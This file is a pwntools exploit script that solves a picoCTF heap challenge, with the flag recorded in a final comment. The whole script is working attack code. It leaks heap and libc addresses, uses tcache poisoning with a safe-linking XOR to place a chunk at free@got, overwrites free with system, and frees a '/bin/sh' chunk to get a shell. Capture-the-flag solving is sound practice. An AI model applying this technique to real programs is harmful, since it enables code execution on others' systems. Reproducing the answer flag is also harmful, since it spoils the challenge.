#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.update(binary=elf, log_level="debug")
p = elf.process()
# p = remote("saturn.picoctf.net", "57757")
# gdb.attach(
#     p,
#     """
#     b *0x401CF4
#     b *0x401D0F
#     b *0x401D2F
#     b *0x401D48
#     """,
# )

def cheat(index, new_name):
    p.sendlineafter(b'Choice: ', b'0')
    p.sendlineafter(b'(0-17)? ', str(index).encode())
    p.sendlineafter(b'characters: ', new_name)
    p.sendlineafter(b'New spot? ', b'0')

def add(index, size, name):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'(0-17)? ', str(index).encode())
    p.sendlineafter(b'length (16-256)? ', str(int(size)).encode())
    p.sendlineafter(b'characters: ', name)

def remove(index):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'(0-17)? ', str(index).encode())

def race():
    p.sendlineafter(b'Choice: ', b'3')
    data = p.recvuntil(b"WINNER")
    leaks = []
    # return data.split(b"\n")[0:15]
    for line in data.split(b"\n")[1:15]:
        if b"|" not in data:
            continue
        line = line.strip(b" |\n\r")
        print("STRIPPED", line)
        leaks.append(u64(line.ljust(8, b"\x00")))
    leaks = [a for a in leaks if a != 0]
    print([hex(a) for a in leaks])

    heap_leak = leaks[-1] * 2**12 # << 12
    libc_leak = leaks[-2]
    # print(f"{hex(heap_leak)=}")
    # print(f"{hex(libc_leak)=}")
    return (heap_leak, libc_leak)

# 1. create t-cache and unsorted bins
for i in range(12):
    add(i, 0x100, b'\xff')
    
# 0 -> 6 t-cache | 7, 8, 9, 10, 11 = unsortedbins 0x551
for i in range(11, -1, -1):
    remove(i)

for i in range(12):
    add(i, 0x100, b'\xff')

# print(race())
# 2. leak heap and libc address
(heap_base, libc_base) = race()
libc.address = libc_base - (0x7f2bb8b5f040 - 0x7f2bb89a1000) # 0x1be040
log.info("LIBC base address: " + hex(libc.address))
log.info("HEAP base address: " + hex(heap_base))

# 3. t-cache poisoning to get new chunk @ free@got
remove(1)
remove(0)

new_fd_pointer = (heap_base >> (12)) ^ (elf.got['free'] - 8)
print(f"{new_fd_pointer=}")
log.info("new_fd_pointer address: " + hex(new_fd_pointer))
cheat(0, p64(new_fd_pointer)+b"\xff")

# overwrite free@got with system
add(15, 0x100, b"/bin/sh\x00\xff")
system = p64(libc.symbols['system'])
# system = system[:-3] + b'\x16' + b'\x7f\x00'
# print(system) socat fix in server
payload = p64(0xDEADBEEF) + system + b'\xff'
add(16, 0x100, payload)
remove(15)

p.interactive()
# picoCTF{t_cache_4ll_th3_w4y_2_th4_b4nk_237a0607}